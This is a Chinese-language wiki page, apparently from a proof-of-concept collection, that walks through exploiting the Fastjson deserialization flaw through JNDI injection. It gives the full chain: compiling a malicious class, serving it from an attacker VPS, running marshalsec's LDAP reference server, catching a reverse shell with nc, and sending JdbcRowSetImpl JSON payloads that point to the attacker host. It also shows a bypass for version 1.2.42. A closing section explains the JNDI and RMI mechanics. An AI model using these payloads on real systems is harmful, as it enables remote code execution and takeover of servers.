# FastJson反序列化漏洞利用

## 利用条件：

- 基于ldap的利用方式，适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。
- 基于rmi的利用方式，适用jdk版本：JDK 6u132，JDK 7u131，JDK 8u121之前。
- （实战首选ldap，支持的jdk版本较多）
- Fastjson < 1.2.25
- 1.2.24< Fastjson <1.2.48 版本后增加了反序列化白名单，可以利用特殊构造的json字符串绕过白名单检测

## 利用方法：

### 步骤一：测试是否可能存在fastjson反序列化漏洞

使用json格式参数的POST请求，查看请求是否报错和返回结果。

### 步骤二：准备要执行的 Java 恶意代码

修改恶意类代码 [JNDIObject.java](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发语言漏洞/JAVA/FsatJson/file/JNDIObject.java) 并编译生成恶意类 JNDIObject.class

```bash
javac JNDIObject.java
```
![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发语言漏洞/JAVA/FsatJson/image/javaCode.jpg)
> ⚠️port为nc监听端口

### 步骤三：搭建http服务传输恶意文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）
```bash
# 使用 python 快速开启 http server
python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```
并将生成的 `JNDIObject.class` 文件拷贝到 该服务的根目录。

### 步骤四：架设恶意类的 ldap 服务

下载 [marshalsec](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发语言漏洞/JAVA/FsatJson/file/marshalsec-0.0.3-SNAPSHOT-all.jar) ，使用下面命令架设对应的 ldap 服务：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
```

> ⚠️恶意类的ldap服务监听端口和poc中访问的接口一致

### 步骤五：监听反弹 shell 的端口

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lv 443
```

### 步骤六：修改请求包数据，发送poc

```bash
{
	"b":{
		"@type":"com.sun.rowset.JdbcRowSetImpl",
		"dataSourceName":"ldap://your-vps-ip:1389/JNDIObject",
		"autoCommit":true
	}
}
```
> ⚠️poc中访问的接口和恶意类的ldap服务监听端口一致

### 1.2.42版本绕过
fastjson在1.2.42版本新增了校验机制。如果输入类名的开头和结尾是L和;就将头尾去掉再进行黑名单校验。绕过方法：在类名外部嵌套两层L和;。
原类名：```com.sun.rowset.JdbcRowSetImpl```
绕过：```LLcom.sun.rowset.JdbcRowSetImpl;;```
EXP：
```bash
{           
	"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
	"dataSourceName":"ldap://x.x.x.x:1389/JNDIObject",
	"autoCommit":true
}
```
> autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

## 漏洞原理：

1. 首先开启HTTP服务器，并将我们的恶意类放在目录下
2. 开启恶意RMI服务器
3. 攻击者控制url参数为上一步开启的恶意RMI服务器地址
4. 恶意RMI服务器返回ReferenceWrapper类
5. 目标（JNDI_Client）在执行lookup操作的时候，在decodeObject中将ReferenceWrapper变成Reference类，然后远程加载并实例化我们的Factory类（即远程加载我们HTTP服务器上的恶意类），在实例化时触发静态代码片段中的恶意代码

## 漏洞分析：
### JNDI
JNDI是 Java 命名与目录接口（Java Naming and Directory Interface），在J2EE规范中是重要的规范之一。JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI再局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。

JNDi是应用程序设计的Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：
```bash
DNS、LDAP、CORBA对象服务、RMI
```
### 利用JNDI References进行注入
对于这个知识点，我们需要先了解RMI的作用。

首先RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。RMI服务端可以直接绑定远程调用的对象以外，还可通过References类来绑定一个外部的远程对象，当RMI绑定了References之后，首先会利用Referenceable.getReference()获取绑定对象的引用，并在目录中保存，当客户端使用lookup获取对应名字时，会返回ReferenceWrapper类的代理文件，然后会调用getReference()获取Reference类，最终通过factory类将Reference转换为具体的对象实例。

服务端
```bash
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
	public static void main(String args[]) throws Exception {
		Registry registry = LocateRegistry.createRegistry(1099);
		// Reference需要传入三个参数(className,factory,factoryLocation)
		// 第一个参数随意填写即可，第二个参数填写我们http服务下的类名，第三个参数填写我们的远程地址
		Reference refObj = new Reference("Evil", "EvilObject", "http://127.0.0.1:8000/");
		// ReferenceWrapper包裹Reference类，使其能够通过RMI进行远程访问
		ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
		registry.bind("refObj", refObjWrapper);
	}
}
```

客户端
```bash
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JNDIClient {
	public static void main(String[] args) throws Exception{
		try {
			Context ctx = new InitialContext();
			ctx.lookup("rmi://localhost:8000/refObj");
		}catch (NamingException e) {
			e.printStackTrace();
		}
	}
}
```
如果我们可以控制JNDI客户端中传入的url，就可以起一个恶意的RMI，让JNDI来加载我们的恶意类从而进行命令执行。

我们来看一下References，References类有两个属性，className和codebase url，className就是远程引用的类名，codebase决定了我们远程类的位置，当本地classpath中没有找到对应的类的时候，就会去请求codebase地址下的类（codebase支持http协议），此时如果我们将codebase地址下的类换成我们的恶意类，就能让客户端执行。

ps：在java版本大于1.8u191之后版本存在trustCodebaseURL的限制，只能信任已有的codebase地址，不再能够从指定codebase中下载字节码。


## 漏洞总结：

1. 反序列化常用的两种利用方式，一种是基于rmi，一种是基于ldap。
2. RMI是一种行为，指的是Java远程方法调用。
3. JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。
4. ldap指轻量级目录服务协议。
